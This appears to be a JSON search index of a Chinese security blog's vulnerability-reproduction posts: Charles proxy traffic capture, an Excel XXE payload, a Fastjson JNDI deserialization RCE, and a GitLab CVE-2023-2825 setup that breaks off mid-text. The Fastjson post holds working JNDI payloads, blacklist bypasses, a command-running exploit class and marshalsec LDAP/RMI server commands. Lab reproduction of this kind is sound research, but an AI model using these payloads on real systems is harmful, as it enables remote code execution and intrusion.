[{"title":"Charles给小程序抓包","url":"/2022/09/16/Charles%E7%BB%99%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8A%93%E5%8C%85/","content":"<h1 id=\"Charles给小程序抓包\"><a href=\"#Charles给小程序抓包\" class=\"headerlink\" title=\"Charles给小程序抓包\"></a>Charles给小程序抓包</h1><h2 id=\"一、安装Charles\"><a href=\"#一、安装Charles\" class=\"headerlink\" title=\"一、安装Charles\"></a>一、安装Charles</h2><p>1.安装证书</p>\n<p><img src=\"pG0XoC9MAsAcFgjLaPCGtxmjRYSumjC66wajCa-MA0c.png\" alt=\"image\"></p>\n<p><img src=\"3vrOpGZfAJC9lEWinoeCeTW9XY_gCHfgyxtidLx2CcY.png\" alt=\"image\"></p>\n<p><img src=\"ic0fMqTG_FaV8bh7MiraFTy1GRlNY2wXYnSDKuDRC10.png\" alt=\"image\"></p>\n<p><img src=\"HfMPoQHzBaRKmzJCDymIZWXxjHSNYPpRb05EtXE-oZQ.png\" alt=\"image\"></p>\n<p><img src=\"NSQXtmABHU2aPteRXdZBInKs2T-kKA1ojVE5k4Sn5jo.png\" alt=\"image\"></p>\n<p><img src=\"e3Z7LvW3Qr6j3VOVA8MsObSzdN-P7ELokKENBVKzacI.png\" alt=\"image\"></p>\n<p>设置SSL和开启SSL</p>\n<p><img src=\"L3bmZHLDAjZJjYHGWXBXB3vuozNJldC-HCqX370yhY8.png\" alt=\"image\"></p>\n<p><img src=\"YzLESr7yJkCnbQkjBSOamFkl0nhxCu0acS61yb1uzbw.png\" alt=\"image\"></p>\n<p>设置监听的端口</p>\n<p><img src=\"NicAqY665h3xuhY2pndYy3p3uysksVRUYqcIbavQTo0.png\" alt=\"image\"></p>\n<p><img src=\"1vLCaHgibVtdIJKdPoKvW-9j9lHKxqOadtv3RVMDnas.png\" alt=\"image\"></p>\n<h2 id=\"二、安装Proxifer\"><a href=\"#二、安装Proxifer\" class=\"headerlink\" title=\"二、安装Proxifer\"></a>二、安装Proxifer</h2><p>思路：</p>\n<p>让小程序流量走Charles–&gt;让Charles走burp  其它的放行</p>\n<p><img src=\"b3IN9unshvh5wYczl5Vjm3sZfXFiF3PQpLPFJIJTGeo.png\" alt=\"image\"></p>\n<p><img src=\"tBp7d1hsWSHZJhvOGGPtCY_Aw50qxm4rgxXJ7-Q4pXY.png\" alt=\"image\"></p>\n<p><img src=\"MmY3TjFbAJ9DCGj3oy410LsnHyQzQFPhc_5Zo_7-Ir4.png\" alt=\"image\"></p>\n<p>一号箭头处要设置为direct，不然抓的包很乱</p>\n<h2 id=\"三、注意\"><a href=\"#三、注意\" class=\"headerlink\" title=\"三、注意\"></a>三、注意</h2><p>1.如果没有流量的话，可以尝试重启电脑</p>\n<p>2.所有的程序使用管理员运行</p>\n<p>3.可以先在Charles中观察一下流量，确认没问题后再转发给burp</p>\n<p><img src=\"mVbHzSvFC2K6awz9FVxQMeKIpPIgqJYbWJsp-JMJ1og.png\" alt=\"image\"></p>\n","categories":["工具使用"],"tags":["工具使用","抓包","小程序"]},{"title":"Excel的XXE攻击","url":"/2022/12/30/Excel%E7%9A%84XXE%E6%94%BB%E5%87%BB/","content":"<h1 id=\"Excel的XXE攻击\"><a href=\"#Excel的XXE攻击\" class=\"headerlink\" title=\"Excel的XXE攻击\"></a>Excel的XXE攻击</h1><h2 id=\"一、概述\"><a href=\"#一、概述\" class=\"headerlink\" title=\"一、概述\"></a>一、概述</h2><p>Microsoft Office从2007版本引入了新的开放的XML文件格式，基于压缩的ZIP文件格式规范，改后缀名为zip再解压缩可以发现其中多数是描述工作簿数据、元数据、文档信息的XML文件。</p>\n<p>xls与xlsx格式不同，xls是特有的二进制格式，其核心结构是复合文档类型，而xlsx的核心结构是XML类型，采用基于XML的压缩方式。xls格式文件无法插入payload进行XXE攻击<br>测试的时候，根据功能点，docx，xlsx都可以尝试。</p>\n<h2 id=\"二、制作恶意的xlsx\"><a href=\"#二、制作恶意的xlsx\" class=\"headerlink\" title=\"二、制作恶意的xlsx\"></a>二、制作恶意的xlsx</h2><p>制作xlsx：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">unzip payload.xlsx</span><br><span class=\"line\">zip -r payload.xslx *</span><br></pre></td></tr></table></figure>\n<p>添加xxe的payload</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE x [ &lt;!ENTITY xxe SYSTEM <span class=\"string\">&quot;http://127.0.0.1:7788/xxe&quot;</span>&gt; ]&gt;</span><br><span class=\"line\">&lt;x&gt;&amp;xxe;&lt;/x&gt;</span><br></pre></td></tr></table></figure>\n<p><img src=\"gtiUbvWNbXK-tZ3T1KTU_idl9EfeYQCOkNLA6GyBK-8.png\" alt=\"image\"></p>\n<h2 id=\"三、idea复现\"><a href=\"#三、idea复现\" class=\"headerlink\" title=\"三、idea复现\"></a>三、idea复现</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> org.apache.poi.ss.usermodel.Cell;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.poi.ss.usermodel.Row;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.poi.xssf.usermodel.XSSFSheet;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.poi.xssf.usermodel.XSSFWorkbook;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.File;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.FileInputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">poc</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> IOException, InterruptedException &#123;</span><br><span class=\"line\">        <span class=\"type\">File</span> <span class=\"variable\">excelFile</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">File</span>(<span class=\"string\">&quot;/Users/garck/D/java-code/javaStudy/excel_xxe/2/payload2.xlsx&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">FileInputStream</span> <span class=\"variable\">in</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">FileInputStream</span>(excelFile);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">XSSFWorkbook</span> <span class=\"variable\">workbook</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">XSSFWorkbook</span>(in);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">XSSFSheet</span> <span class=\"variable\">sheet</span> <span class=\"operator\">=</span> workbook.getSheetAt(<span class=\"number\">0</span>);</span><br><span class=\"line\">        <span class=\"type\">int</span> <span class=\"variable\">total</span> <span class=\"operator\">=</span> sheet.getLastRowNum();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">for</span>(Row row : sheet)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (Cell cell : row)&#123;</span><br><span class=\"line\">                System.out.println(cell.getStringCellValue()+<span class=\"string\">&quot; &quot;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>pom.xml</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span> encoding=<span class=\"string\">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">project</span> <span class=\"attr\">xmlns</span>=<span class=\"string\">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">         <span class=\"attr\">xmlns:xsi</span>=<span class=\"string\">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">         <span class=\"attr\">xsi:schemaLocation</span>=<span class=\"string\">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">modelVersion</span>&gt;</span>4.0.0<span class=\"tag\">&lt;/<span class=\"name\">modelVersion</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.example<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>excel_xxe<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>1.0-SNAPSHOT<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">properties</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">maven.compiler.source</span>&gt;</span>8<span class=\"tag\">&lt;/<span class=\"name\">maven.compiler.source</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">maven.compiler.target</span>&gt;</span>8<span class=\"tag\">&lt;/<span class=\"name\">maven.compiler.target</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">properties</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">dependencies</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.apache.poi<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>poi-ooxml<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>3.9<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.apache.poi<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>ooxml-schemas<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>1.1<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">dependencies</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">project</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>复现截图：</p>\n<p><img src=\"A_eSYE5PnUs_d1FttT-9Lgaalp3qMBjgZnBiU5D-aNk.png\" alt=\"image\"></p>\n","categories":["漏洞复现"],"tags":["漏洞复现","XXE"]},{"title":"Fasjson漏洞不出网（本地序列化）","url":"/2022/05/06/Fasjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/","content":"<h1 id=\"Fasjson漏洞复现与分析\"><a href=\"#Fasjson漏洞复现与分析\" class=\"headerlink\" title=\"Fasjson漏洞复现与分析\"></a>Fasjson漏洞复现与分析</h1><h2 id=\"创建项目\"><a href=\"#创建项目\" class=\"headerlink\" title=\"创建项目\"></a>创建项目</h2><p>1.创建一个maven项目</p>\n<p><img src=\"V2bBEVq5-d9VfJOQzwpQZGv95JcBgpDTnScGEAuDQZI.png\" alt=\"image\"></p>\n<p><img src=\"ZYkUDEL0pwcJevSYpWV43dXmSJE2Y-Cb7CG4-7EBo84.png\" alt=\"image\"></p>\n<h2 id=\"配置pom-xml\"><a href=\"#配置pom-xml\" class=\"headerlink\" title=\"配置pom.xml\"></a>配置pom.xml</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span> encoding=<span class=\"string\">&quot;UTF-8&quot;</span>?&gt;</span><br><span class=\"line\">&lt;project xmlns=<span class=\"string\">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class=\"line\">         xmlns:xsi=<span class=\"string\">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class=\"line\">         xsi:schemaLocation=<span class=\"string\">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br><span class=\"line\">    &lt;modelVersion&gt;<span class=\"number\">4.0</span><span class=\"number\">.0</span>&lt;/modelVersion&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;groupId&gt;groupId&lt;/groupId&gt;</span><br><span class=\"line\">    &lt;artifactId&gt;Fastjson1<span class=\"number\">.2</span>.66_RCE&lt;/artifactId&gt;</span><br><span class=\"line\">    &lt;version&gt;<span class=\"number\">1.0</span>-SNAPSHOT&lt;/version&gt;</span><br><span class=\"line\">    &lt;dependencies&gt;</span><br><span class=\"line\">        &lt;dependency&gt;</span><br><span class=\"line\">            &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class=\"line\">            &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class=\"line\">            &lt;version&gt;<span class=\"number\">1.2</span><span class=\"number\">.67</span>&lt;/version&gt;</span><br><span class=\"line\">        &lt;/dependency&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">        &lt;dependency&gt;</span><br><span class=\"line\">            &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;</span><br><span class=\"line\">            &lt;artifactId&gt;shiro-core&lt;/artifactId&gt;</span><br><span class=\"line\">            &lt;version&gt;<span class=\"number\">1.5</span><span class=\"number\">.1</span>&lt;/version&gt;</span><br><span class=\"line\">        &lt;/dependency&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">        &lt;dependency&gt;</span><br><span class=\"line\">            &lt;groupId&gt;org.slf4j&lt;/groupId&gt;</span><br><span class=\"line\">            &lt;artifactId&gt;slf4j-simple&lt;/artifactId&gt;</span><br><span class=\"line\">            &lt;version&gt;<span class=\"number\">1.7</span><span class=\"number\">.25</span>&lt;/version&gt;</span><br><span class=\"line\">            &lt;scope&gt;test&lt;/scope&gt;</span><br><span class=\"line\">        &lt;/dependency&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">        &lt;dependency&gt;</span><br><span class=\"line\">            &lt;groupId&gt;org.slf4j&lt;/groupId&gt;</span><br><span class=\"line\">            &lt;artifactId&gt;slf4j-nop&lt;/artifactId&gt;</span><br><span class=\"line\">            &lt;version&gt;<span class=\"number\">1.7</span><span class=\"number\">.25</span>&lt;/version&gt;</span><br><span class=\"line\">        &lt;/dependency&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;/dependencies&gt;</span><br><span class=\"line\">    &lt;properties&gt;</span><br><span class=\"line\">        &lt;project.build.sourceEncoding&gt;UTF-<span class=\"number\">8</span>&lt;/project.build.sourceEncoding&gt;</span><br><span class=\"line\">        &lt;maven.compiler.encoding&gt;UTF-<span class=\"number\">8</span>&lt;/maven.compiler.encoding&gt;</span><br><span class=\"line\">        &lt;java.version&gt;<span class=\"number\">1.8</span>&lt;/java.version&gt;</span><br><span class=\"line\">        &lt;maven.compiler.source&gt;<span class=\"number\">1.8</span>&lt;/maven.compiler.source&gt;</span><br><span class=\"line\">        &lt;maven.compiler.target&gt;<span class=\"number\">1.8</span>&lt;/maven.compiler.target&gt;</span><br><span class=\"line\">    &lt;/properties&gt;</span><br><span class=\"line\">&lt;/project&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"创建类\"><a href=\"#创建类\" class=\"headerlink\" title=\"创建类\"></a>创建类</h2><p>创建一个测试类</p>\n<p><img src=\"ZIraM7euFC85iz_yp8L9moKDglLVwM1FZZEJ1etDkUA.png\" alt=\"image\"></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> com.alibaba.fastjson.JSON;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">fasttest</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">        System.setProperty(<span class=\"string\">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>, <span class=\"string\">&quot;true&quot;</span>);</span><br><span class=\"line\">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class=\"literal\">true</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">payload</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;&#123;\\&quot;@type\\&quot;:\\&quot;org.apache.shiro.jndi.JndiObjectFactory\\&quot;,\\&quot;resourceName\\&quot;:\\&quot;ldap://127.0.0.1:1389/Exploit\\&quot;&#125;&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            JSON.parseObject(payload);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>解决报错问题</p>\n<p><img src=\"OVXa8hqM2Aba8EN1xU3ItffLLuCxbalCy663uFaXUVo.png\" alt=\"image\"></p>\n<h2 id=\"创建恶意类\"><a href=\"#创建恶意类\" class=\"headerlink\" title=\"创建恶意类\"></a>创建恶意类</h2><p>Exploit_win_calc类</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Exploit_win_calc</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">Exploit_win_calc</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">            <span class=\"comment\">// 要执行的命令</span></span><br><span class=\"line\">            String[] commands = &#123;<span class=\"string\">&quot;calc.exe&quot;</span>&#125;;</span><br><span class=\"line\">            <span class=\"type\">Process</span> <span class=\"variable\">pc</span> <span class=\"operator\">=</span> Runtime.getRuntime().exec(commands);</span><br><span class=\"line\">            pc.waitFor();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span>(Exception e)&#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] argv)</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">Exploit_win_calc</span> <span class=\"variable\">e</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Exploit_win_calc</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"启动LDAP服务\"><a href=\"#启动LDAP服务\" class=\"headerlink\" title=\"启动LDAP服务\"></a>启动LDAP服务</h2><p>起一个web服务</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">python37 -m http.server <span class=\"number\">8888</span></span><br></pre></td></tr></table></figure>\n<p>用marshalsec-0.0.3-SNAPSHOT-all.jar起一个LDAP服务（监听在1333端口，默认1389）</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">java -cp marshalsec-<span class=\"number\">0.0</span><span class=\"number\">.3</span>-SNAPSHOT-<span class=\"built_in\">all</span>.jar marshalsec.jndi.LDAPRefServer <span class=\"string\">&quot;http://127.0.0.1:8888/#Exploit_win_calc&quot;</span> <span class=\"number\">1333</span></span><br></pre></td></tr></table></figure>\n<p>用marshalsec-0.0.3-SNAPSHOT-all.jar起一个RMI服务（监听在9999端口，默认1099）(攻击的代码中需要修改为rmi协议出网)</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">java -cp marshalsec-<span class=\"number\">0.0</span><span class=\"number\">.3</span>-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer <span class=\"string\">&quot;http://127.0.0.1:8888/#Exploit_win_calc&quot;</span> <span class=\"number\">9999</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"运行测试类\"><a href=\"#运行测试类\" class=\"headerlink\" title=\"运行测试类\"></a>运行测试类</h2><p><img src=\"n_o9BhzbP2BhN4ZMaqPBlWWFe0ByqjA0zC6XnKPEbRs.png\" alt=\"image\"></p>\n<p><strong>1.2.25~1.2.45</strong></p>\n<p>绕过黑名单的方式</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;\\<span class=\"string\">&quot;@type\\&quot;:\\&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\\&quot;,\\&quot;properties\\&quot;:&#123;\\&quot;data_source\\&quot;:\\&quot;rmi://127.0.0.1:1099/Exploit\\&quot;&#125;&#125;</span></span><br></pre></td></tr></table></figure>\n<p>pom.xml</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span> encoding=<span class=\"string\">&quot;UTF-8&quot;</span>?&gt;</span><br><span class=\"line\">&lt;project xmlns=<span class=\"string\">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class=\"line\">         xmlns:xsi=<span class=\"string\">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class=\"line\">         xsi:schemaLocation=<span class=\"string\">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br><span class=\"line\">    &lt;modelVersion&gt;<span class=\"number\">4.0</span><span class=\"number\">.0</span>&lt;/modelVersion&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;groupId&gt;groupId&lt;/groupId&gt;</span><br><span class=\"line\">    &lt;artifactId&gt;Fastjson1<span class=\"number\">.2</span>.39_RCE&lt;/artifactId&gt;</span><br><span class=\"line\">    &lt;version&gt;<span class=\"number\">1.0</span>-SNAPSHOT&lt;/version&gt;</span><br><span class=\"line\">    &lt;dependencies&gt;</span><br><span class=\"line\">        &lt;dependency&gt;</span><br><span class=\"line\">            &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class=\"line\">            &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class=\"line\">            &lt;version&gt;<span class=\"number\">1.2</span><span class=\"number\">.44</span>&lt;/version&gt;</span><br><span class=\"line\">        &lt;/dependency&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">        &lt;dependency&gt;</span><br><span class=\"line\">            &lt;groupId&gt;org.mybatis&lt;/groupId&gt;</span><br><span class=\"line\">            &lt;artifactId&gt;mybatis&lt;/artifactId&gt;</span><br><span class=\"line\">            &lt;version&gt;<span class=\"number\">3.5</span><span class=\"number\">.2</span>&lt;/version&gt;</span><br><span class=\"line\">        &lt;/dependency&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;/dependencies&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;properties&gt;</span><br><span class=\"line\">        &lt;project.build.sourceEncoding&gt;UTF-<span class=\"number\">8</span>&lt;/project.build.sourceEncoding&gt;</span><br><span class=\"line\">        &lt;maven.compiler.encoding&gt;UTF-<span class=\"number\">8</span>&lt;/maven.compiler.encoding&gt;</span><br><span class=\"line\">        &lt;java.version&gt;<span class=\"number\">1.8</span>&lt;/java.version&gt;</span><br><span class=\"line\">        &lt;maven.compiler.source&gt;<span class=\"number\">1.8</span>&lt;/maven.compiler.source&gt;</span><br><span class=\"line\">        &lt;maven.compiler.target&gt;<span class=\"number\">1.8</span>&lt;/maven.compiler.target&gt;</span><br><span class=\"line\">    &lt;/properties&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;/project&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n\n<p>fastjson 1.2.66 -</p>\n<p>和1.2.62类似，在开启AutoType的情况下，由于黑名单过滤不全而导致的绕过问题</p>\n<p>{“@type”:”org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup”,”jndiNames”:”ldap:&#x2F;&#x2F;x.x.x.x&#x2F;Exp”}</p>\n","categories":["漏洞复现"],"tags":["漏洞复现","反序列化","不出网","Fasjson"]},{"title":"GitLab任意读取文件漏洞简单复现(CVE-2023-2825)","url":"/2023/05/25/GitLab%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0(CVE-2023-2825)/","content":"<h1 id=\"GitLab任意读取文件漏洞简单复现-CVE-2023-2825\"><a href=\"#GitLab任意读取文件漏洞简单复现-CVE-2023-2825\" class=\"headerlink\" title=\"GitLab任意读取文件漏洞简单复现(CVE-2023-2825)\"></a>GitLab任意读取文件漏洞简单复现(CVE-2023-2825)</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>CVE-2023-2825 漏洞源于路径遍历问题，当一个附件存在于至少五个组内嵌套的公共项目中时，未经认证的攻击者可以在服务器上读取任意文件。利用 CVE-2023-2825 漏洞还可能会暴露包括专有软件代码、用户凭证、令牌、文件和其他私人信息在内的敏感数据。</p>\n<h2 id=\"影响版本\"><a href=\"#影响版本\" class=\"headerlink\" title=\"影响版本\"></a>影响版本</h2><p>GitLab CE&#x2F;EE版本：16.0.0</p>\n<h2 id=\"环境搭建\"><a href=\"#环境搭建\" class=\"headerlink\" title=\"环境搭建\"></a>环境搭建</h2><p>这里直接使用docker搭建16版本的环境；拉去镜像</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker pull gitlab/gitlab-ce:16.0.0-ce.0</span><br></pre></td></tr></table></figure>\n<p><img src=\"tRR9SBfOOPyPkc4S3Hk067a_fEt0wmqNsZHfVpMhrZI.png\" alt=\"image\"></p>\n<p>启动命令</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run -itd -p 8443:443 -p 8880:80 -p 222:22 --name gitlab2825   gitlab/gitlab-ce:16.0.0-ce.0</span><br></pre></td></tr></table></figure>\n<p><img src=\"JiwcsQop75vcxmrJ7NSycJTDEqxLGvuCZzBNyDh_3-I.png\" alt=\"image\"></p>\n<p>稍等片刻即可</p>\n<p><img src=\"RRDZ7seX8iFugonYitxgCc_7I7EC9o-lHdAYayYmLi8.png\" alt=\"image\"></p>\n<p>进入容器内部查看密码</p>\n<p><img src=\"0yZfuVGvqXG47mEdiW0UpVvSkNgIcj_MiXlYyzOnRNk.png\" alt=\"image\"></p>\n<p>使用账号root结合该密码成功登录到gitlab</p>\n<h2 id=\"创建group嵌套项目\"><a href=\"#创建group嵌套项目\" class=\"headerlink\" title=\"创建group嵌套项目\"></a>创建group嵌套项目</h2><p>创建十五个group</p>\n<p><img src=\"bU7Cunga7iYSOMi6jdfIWlwXWVvhBHe1ipXGLEU_2zM.png\" alt=\"image\"></p>\n<p>创建一个项目</p>\n<p><img src=\"ePxwe5Rne-ROYZZ7i5mm8FYgD7LJGDQuEPxJahtO3C4.png\" alt=\"image\"></p>\n<p>从模板添加一个项目</p>\n<p><img src=\"7M6Yha67hefjvEUoG75GaRjRM0aBlZBVaMJt4QarZ2g.png\" alt=\"image\"></p>\n<h2 id=\"添加项目附件\"><a href=\"#添加项目附件\" class=\"headerlink\" title=\"添加项目附件\"></a>添加项目附件</h2><p>发起iuss</p>\n<p><img src=\"W1S7iy8z1jabIYrvc7uDKIBBWRWEUZtJvbxT2FiJSR8.png\" alt=\"image\"></p>\n<p>添加附件为一个图片</p>\n<p><img src=\"G2n4v1d4IFs1P2cW4DGs_Sh-dmVlo-zmKCJwdFJHwEM.png\" alt=\"image\"></p>\n<p>访问如下URL可以访问附件</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span 